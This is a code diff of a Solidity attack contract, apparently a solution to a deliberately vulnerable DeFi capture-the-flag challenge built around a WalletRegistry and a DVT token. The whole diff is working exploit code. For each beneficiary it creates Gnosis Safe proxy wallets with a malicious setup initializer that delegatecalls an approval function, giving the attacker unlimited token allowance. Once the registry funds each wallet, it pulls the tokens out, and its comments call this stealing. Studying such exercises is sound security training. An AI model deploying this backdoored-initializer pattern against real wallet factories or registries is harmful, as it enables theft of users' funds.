@@ -2,9 +2,11 @@
 
 pragma solidity ^0.8.0;
 
-import "./WalletRegistry.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
+import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
 
-interface IGnosisSafeProxyFactory {
+interface IGnosisSafeproxyFactory {
     function createProxyWithCallback(
         address _singleton,
         bytes memory initializer,
@@ -14,72 +16,79 @@ interface IGnosisSafeProxyFactory {
 }
 
 contract AttackRegistry {
-    IGnosisSafeProxyFactory private proxyFactory;
-    address private gnosisSafeSingleton;
-    address private walletRegistry;
-    IERC20 private DVT;
+    address public proxyFactoryAddress;
+    address public walletRegistryAddress;
+    address public gnosisSingletonAddress;
+    address payable public dtvTokenAddress;
 
     constructor(
-        address _proxyFactory,
-        address _gnosisSafeSingleton,
-        address _walletRegistry,
-        address _DVT
+        address _proxyFactoryAddress,
+        address _walletRegistryAddress,
+        address _gnosisSingletonAddress,
+        address payable _dtvTokenAddress
     ) {
-        proxyFactory = IGnosisSafeProxyFactory(_proxyFactory);
-        gnosisSafeSingleton = _gnosisSafeSingleton;
-        walletRegistry = _walletRegistry;
-        DVT = IERC20(_DVT);
+        proxyFactoryAddress = _proxyFactoryAddress;
+        walletRegistryAddress = _walletRegistryAddress;
+        gnosisSingletonAddress = _gnosisSingletonAddress;
+        dtvTokenAddress = _dtvTokenAddress;
     }
 
     /**
-    Called by Gnosisproxy wallet during setup,
-    approves spender to transferFrom max possible tokens
+    DelegatedCalled to during setup,
+    approves max tokens to be transferred by attacker
+    from beneficiaries wallet
      */
-    function approveDVT(address _spender) external {
-        DVT.approve(_spender, type(uint256).max);
+    function approveDVT(address _spender, address _token) external {
+        IERC20(_token).approve(_spender, type(uint256).max);
     }
 
-    function attack(address[] memory _beneficiaries) external {
-        uint256 len = _beneficiaries.length;
-        for (uint256 i = 0; i < len; i++) {
-            //Setup owners array
-            address[] memory walletOwners = new address[](1);
-            walletOwners[0] = _beneficiaries[i];
+    function attack(
+        address _attacker,
+        address[] calldata _beneficiaries,
+        uint256 _transferAmount
+    ) external {
+        for (uint256 i = 0; i < _beneficiaries.length; i++) {
+            //Setup owner of wallet
+            address[] memory owners = new address[](1);
+            owners[0] = _beneficiaries[i];
 
-            //Setup initializer for proxy creation
-            bytes memory initializer = abi.encodeWithSelector(
-                GnosisSafe.setup.selector, //GnosisSafe::setup function signature
-                //GnosisSafe::setup parameters
-                walletOwners, //wallet owners
-                1, //wallet threshold
-                address(this), //address to which a delegateCall is made
-                abi.encodeWithSelector( //data to use in the delegateCall
-                    AttackRegistry.approveDVT.selector,
-                    address(this)
-                ),
-                address(0), //fallback handler
-                address(0), // payment token
-                0, // payment
-                address(0) //payment receiver
+            //Data to call approveDVT during setup
+            bytes memory setupData = abi.encodeWithSignature(
+                "approveDVT(address,address)",
+                address(this),
+                dtvTokenAddress
             );
 
             /**
-            Create gnosis proxy with malicious initializer, 
-            which approves this contract to transfer DVT
-            from gnosis wallet
+            Data to be used during proxy wallet creation,
+            contains malicious setupData
              */
-            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
-                gnosisSafeSingleton, //_singleton
-                initializer, //initializer
-                i, //saltNonce
-                IProxyCreationCallback(walletRegistry) //callback
+            bytes memory initializer = abi.encodeWithSignature(
+                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+                owners,
+                1,
+                address(this),
+                setupData,
+                address(0),
+                address(0),
+                0,
+                address(0)
             );
 
-            //Transfer tokens from victim
-            DVT.transferFrom(
+            //Create proxy with malicous setup and register the new wallet in the registry
+            GnosisSafeProxy proxy = IGnosisSafeproxyFactory(proxyFactoryAddress)
+                .createProxyWithCallback(
+                    gnosisSingletonAddress,
+                    initializer,
+                    0,
+                    IProxyCreationCallback(walletRegistryAddress)
+                );
+
+            //Attacker steals tokens after the registry has transferred them to new wallet
+            IERC20(dtvTokenAddress).transferFrom(
                 address(proxy),
-                msg.sender,
-                DVT.balanceOf(address(proxy))
+                _attacker,
+                _transferAmount
             );
         }
     }
